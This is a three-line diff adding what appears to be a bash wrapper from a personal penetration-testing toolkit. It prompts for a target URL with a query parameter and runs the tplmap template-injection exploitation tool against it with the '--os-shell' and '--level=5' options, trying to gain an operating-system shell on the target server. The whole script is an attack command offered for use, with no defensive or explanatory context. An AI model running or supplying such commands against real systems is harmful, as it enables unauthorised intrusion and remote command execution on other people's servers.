@@ -1,0 +1,3 @@
+read -p 'Enter url/with?data=x: ' url
+
+python2 /root/pwn/toolk1t/3_Content-Discovery/tplmap/tplmap.py -u $url --os-shell --level=5
